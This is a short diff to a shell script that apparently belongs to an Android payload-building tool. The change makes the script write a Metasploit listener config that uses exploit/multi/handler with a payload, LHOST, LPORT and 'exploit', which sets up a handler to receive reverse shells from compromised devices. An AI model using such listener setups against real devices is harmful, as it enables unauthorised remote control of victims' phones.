@@ -1808,7 +1808,8 @@ if [ $? = 0 ] ; then
 save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="myapk");
 svf=$path/config/listeners/$save.rc
 rm -rf $svf >/dev/null 2>&1
-echo "set PAYLOAD $payload" > $svf
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD $payload" >> $svf
 echo "set LHOST $yourip" >> $svf
 echo "set LPORT $yourport" >> $svf
 echo "exploit" >> $svf
